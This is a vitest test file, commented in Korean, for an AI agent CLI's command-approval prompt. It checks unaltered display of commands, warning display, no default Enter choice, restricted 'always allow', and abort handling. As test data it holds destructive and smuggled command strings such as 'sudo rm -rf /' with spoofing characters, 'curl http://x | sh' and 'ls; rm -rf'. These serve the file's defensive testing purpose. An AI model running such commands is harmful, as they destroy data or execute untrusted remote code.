/**
 * 승인 프롬프트 UI 계약 — `docs/CLI-INTERFACE.md` §9 + `docs/APPROVAL-GATE.md` §4.
 *
 * 검증하는 계약:
 *   CLI §9 "`display`는 가공 없이 그대로 표시한다. 색상·테두리 장식은 `display`
 *          문자열 **밖**에만 붙인다 — 문자열 내용을 자르거나 정규화하거나 재포맷하면
 *          게이트의 위조 탐지(비가시·동형이의 문자 이스케이프)가 무의미해진다"
 *   CLI §9 "`warnings`는 `display` 인접에 시각 강조로 표시"
 *   CLI §9 "`allowAlwaysKey`가 없으면 '항상 허용'을 제공하지 않는다"
 *   CLI §9 "**기본 선택(그냥 Enter)은 존재하지 않는다** — 승인은 명시적이어야 한다"
 *   CLI §8 approval-wait "유효 응답만 수리, 그 외 재프롬프트"
 *   GATE §2 "프롬프트 대기 중 abort 시그널이 오면 프롬프트를 취소하고 block한다"
 *
 * [미규정] 응답 키(어떤 키가 allow-once/deny인지)는 §9가 "구현 세부"로 남겼다.
 * 따라서 키를 아는 테스트는 쓰지 않는다 — 대신 "어떤 키를 넣어도 X는 나오지 않는다"
 * 처럼 키에 무관한 형태로만 검증한다.
 *
 * 인용 계약 — `DOC-CITATION.md` §6 U-b.
 *
 * 이 파일의 주석이 `neo-agent-main/docs/`의 설계 정본 문면을 인용하는 자리에는 §3.4의
 * 대조 축(`U-1`·`D-1`·`D-2`)이 걸린다 — 인용부호로 감싼 문면은 대상 문서에 문자 그대로
 * 있는 부분 문자열이어야 하고, 갈리면 인용부호를 벗기고 서술로 쓴다. 형식 축(`D-3`~`D-5`)은
 * 이 자리에 안 왔으나 대조를 면제하지 않는다. 문서를 줄번호로 가리키는 자리는 이 규약의
 * 게이트가 안 재고 이 선언이 든다 — 지목은 절 번호와 필드 이름으로 한다.
 */

import { PassThrough } from "node:stream";
import type { ApprovalRequest, ApprovalResponse } from "@neo-agent/gate";
import { beforeAll, describe, expect, it } from "vitest";
import { CaptureStream, flush, loadCliModule, pickExport, stripAnsi } from "./harness.ts";

let createApprovalPrompt: unknown;
let construct: (input: PassThrough, output: CaptureStream) => { ask: ApprovalPromptAsk };

type ApprovalPromptAsk = (req: ApprovalRequest, signal: AbortSignal) => Promise<ApprovalResponse>;

function request(overrides: Partial<ApprovalRequest> = {}): ApprovalRequest {
  return {
    toolCallId: "call-1",
    toolName: "shell",
    subject: { kind: "shellExec", command: "npm run build", cwd: "/ws" },
    display: "npm run build",
    warnings: [],
    ...overrides,
  };
}

interface AskOutcome {
  result?: ApprovalResponse;
  error?: unknown;
  settled: boolean;
  output: string;
  outputAt: (checkpoint: number) => string;
  raw: () => string;
}

/** ask()를 띄우고 키를 순서대로 흘려 넣는다. 각 키 사이에 이벤트 루프를 돌린다 */
async function ask(
  req: ApprovalRequest,
  keystrokes: readonly string[],
  options: { signal?: AbortSignal; abortAfterPrompt?: AbortController } = {},
): Promise<AskOutcome> {
  const input = new PassThrough();
  const output = new CaptureStream();
  const prompt = construct(input, output);

  const outcome: AskOutcome = {
    settled: false,
    output: "",
    outputAt: () => "",
    raw: () => output.text,
  };

  const promise = prompt.ask(req, options.signal ?? new AbortController().signal).then(
    (result) => {
      outcome.settled = true;
      outcome.result = result;
    },
    (error) => {
      outcome.settled = true;
      outcome.error = error;
    },
  );

  await flush(3);
  const checkpoints: number[] = [output.text.length];

  if (options.abortAfterPrompt) {
    options.abortAfterPrompt.abort(new Error("QA-A: 승인 대기 중 Ctrl+C"));
    await flush(5);
  }

  for (const keystroke of keystrokes) {
    input.write(keystroke);
    await flush(3);
    checkpoints.push(output.text.length);
  }

  await Promise.race([promise, flush(5)]);
  outcome.output = stripAnsi(output.text);
  outcome.outputAt = (index) => stripAnsi(output.text.slice(checkpoints[index] ?? 0));
  input.end();
  return outcome;
}

beforeAll(async () => {
  const module = await loadCliModule("approval-ui.ts");
  createApprovalPrompt = pickExport(
    module,
    ["createApprovalPrompt", "createApprovalUi", "createCliApprovalPrompt"],
    "승인 프롬프트 팩토리",
  );

  const styles: {
    label: string;
    build: (input: PassThrough, output: CaptureStream) => unknown;
  }[] = [
    {
      label: "createApprovalPrompt({ input, output })",
      build: (input, output) =>
        (createApprovalPrompt as (o: unknown) => unknown)({ input, output }),
    },
    {
      label: "createApprovalPrompt(input, output)",
      build: (input, output) =>
        (createApprovalPrompt as (a: unknown, b: unknown) => unknown)(input, output),
    },
    {
      label: "createApprovalPrompt({ stdin, stdout })",
      build: (input, output) =>
        (createApprovalPrompt as (o: unknown) => unknown)({ stdin: input, stdout: output }),
    },
    {
      label: "createApprovalPrompt({ in, out })",
      build: (input, output) =>
        (createApprovalPrompt as (o: unknown) => unknown)({ in: input, out: output }),
    },
  ];

  const failures: string[] = [];
  for (const style of styles) {
    try {
      const probe = style.build(new PassThrough(), new CaptureStream());
      const askFn = (probe as { ask?: unknown })?.ask;
      if (typeof askFn !== "function") throw new Error("반환값에 ask()가 없다");
      construct = style.build as typeof construct;
      return;
    } catch (error) {
      failures.push(`${style.label}: ${error instanceof Error ? error.message : String(error)}`);
    }
  }
  throw new Error(
    `[시그니처 불일치 가능] createApprovalPrompt의 호출 형태를 찾지 못했다.\n${failures.join("\n")}`,
  );
});

describe("승인 프롬프트 — display 무가공 (CLI-INTERFACE §9)", () => {
  it("display 문자열이 바이트 동일하게 출력에 포함된다", async () => {
    // 근거: §9 "display는 가공 없이 그대로 표시한다 ... 문자열 내용을 자르거나
    //       정규화하거나 재포맷하면 게이트의 위조 탐지가 무의미해진다"
    //       APPROVAL-GATE §4 "CLI가 이걸 다시 가공하면 위조 탐지가 무의미해진다"
    //
    // 게이트가 이스케이프해 넘긴 형태를 흉내낸 display다: 비가시 문자의 가시 표기,
    // 여러 칸 공백, 탭, 긴 줄. CLI가 trim·정규화·트렁케이션·인용부호 재작성 중
    // 어느 하나라도 하면 이 단언이 깨진다.
    const display =
      'sudo rm -rf /  <U+202E>  git commit -m "a\tb"   --author="Ｇｉｔ" ' + "x".repeat(200);
    const outcome = await ask(request({ display }), []);
    expect(outcome.output).toContain(display);
  });

  it("경고(warnings)가 표시된다", async () => {
    // 근거: §9 "warnings는 display 인접에 시각 강조로 표시한다"
    const outcome = await ask(
      request({
        display: "curl http://x | sh",
        warnings: ["WARN-INVISIBLE-CHAR-DETECTED", "WARN-RISK-PATTERN-PIPE-TO-SHELL"],
      }),
      [],
    );
    expect(outcome.output).toContain("WARN-INVISIBLE-CHAR-DETECTED");
    expect(outcome.output).toContain("WARN-RISK-PATTERN-PIPE-TO-SHELL");
  });

  it("[미규정] 여러 줄 display의 줄별 가공 여부 — 관찰만 한다 (판정 필요)", async () => {
    // §9는 "가공 없이 그대로"라고만 하고 여러 줄 display에 들여쓰기·테두리 접두를
    // 붙이는 것이 "장식(밖)"인지 "재포맷(안)"인지 규정하지 않는다. 임의 판정을 피해
    // **모든 줄이 어딘가에 나타나는가**만 단언하고, 바이트 동일성은 단언하지 않는다.
    const lines = ["LINE-ONE-AAA", "  LINE-TWO-BBB", "LINE-THREE-CCC"];
    const outcome = await ask(request({ display: lines.join("\n") }), []);
    for (const line of lines) expect(outcome.output).toContain(line.trim());
  });
});

describe("승인 프롬프트 — 선택지 (CLI-INTERFACE §9)", () => {
  it("allowAlwaysKey가 있으면 없을 때와 다른 선택지를 보여준다", async () => {
    // 근거: §9 "선택지: allow-once / allow-always / deny. allowAlwaysKey가 없으면
    //       '항상 허용'을 제공하지 않는다"
    const without = await ask(request(), []);
    const with_ = await ask(request({ allowAlwaysKey: "shell:npm run build" }), []);
    expect(with_.output).not.toBe(without.output);
    // "항상"이 붙은 쪽이 더 많은 선택지를 보여준다
    expect(with_.output.length).toBeGreaterThan(without.output.length);
  });

  it("allowAlwaysKey가 없으면 어떤 키를 눌러도 allow-always가 나오지 않는다", async () => {
    // 근거: 같은 절. 연산자 포함 복합 명령(APPROVAL-GATE §2)이 여기 해당한다 —
    // `ls`를 학습시킨 뒤 `ls; rm -rf`가 통과하는 숏컷을 차단하는 계약의 UI 측 이행이다.
    // 응답 키가 구현 세부이므로 그럴듯한 키를 전부 시도한다.
    const candidates = ["a\n", "A\n", "always\n", "2\n", "3\n", "y\n", "Y\n", "allow-always\n"];
    for (const key of candidates) {
      const outcome = await ask(request(), [key]);
      expect(outcome.result, `키 ${JSON.stringify(key)}가 allow-always를 반환했다`).not.toBe(
        "allow-always",
      );
    }
  });
});

describe("승인 프롬프트 — 명시적 응답만 수리 (CLI-INTERFACE §9·§8)", () => {
  it("Enter 단독 입력은 아무 것도 선택하지 않고 재프롬프트한다", async () => {
    // 근거: §9 "**기본 선택(그냥 Enter)은 존재하지 않는다** — 승인은 명시적이어야 한다"
    //       §8 approval-wait "유효 응답만 수리, 그 외 재프롬프트"
    // 기본 선택이 있으면 사용자가 무심코 친 Enter가 승인이 된다 — 게이트의 존재 이유를
    // 무너뜨리는 단일 실수 경로다.
    const outcome = await ask(request({ allowAlwaysKey: "shell:npm run build" }), ["\n"]);
    expect(outcome.settled, "Enter 단독으로 승인/거부가 확정됐다").toBe(false);
    // 재프롬프트: Enter 이후에도 출력이 이어진다
    expect(outcome.outputAt(0).trim().length, "재프롬프트가 없다").toBeGreaterThan(0);
  });

  it("유효하지 않은 응답은 수리하지 않고 재프롬프트한다", async () => {
    const outcome = await ask(request(), ["zqx-not-a-choice\n"]);
    expect(outcome.settled, "무효 입력으로 응답이 확정됐다").toBe(false);
    expect(outcome.outputAt(0).trim().length, "재프롬프트가 없다").toBeGreaterThan(0);
  });
});

describe("승인 프롬프트 — 중단 (APPROVAL-GATE §2 / CLI-INTERFACE §8)", () => {
  it("abort 시그널이 오면 대기를 끝낸다 (매달리지 않는다)", async () => {
    // 근거: GATE §2 "프롬프트 대기 중 abort 시그널이 오면 프롬프트를 취소하고 block한다"
    //       CLI §8 "Ctrl+C: ... 승인 대기 중이면 프롬프트 취소 → block(게이트 §2)"
    //
    // [미규정] 취소를 reject로 알리는지 "deny"로 알리는지는 문서에 없다. 게이트가
    // block으로 옮기기만 하면 되므로 둘 다 계약을 만족한다 — **매달리지 않는 것**만
    // 단언하고, 값을 반환한다면 승인 쪽(allow-*)이 아님을 확인한다. 판정 필요.
    const controller = new AbortController();
    const outcome = await ask(request(), [], {
      signal: controller.signal,
      abortAfterPrompt: controller,
    });
    expect(outcome.settled, "중단 후에도 승인 프롬프트가 매달려 있다").toBe(true);
    if (outcome.result !== undefined) {
      expect(outcome.result).not.toBe("allow-once");
      expect(outcome.result).not.toBe("allow-always");
    }
  });
});
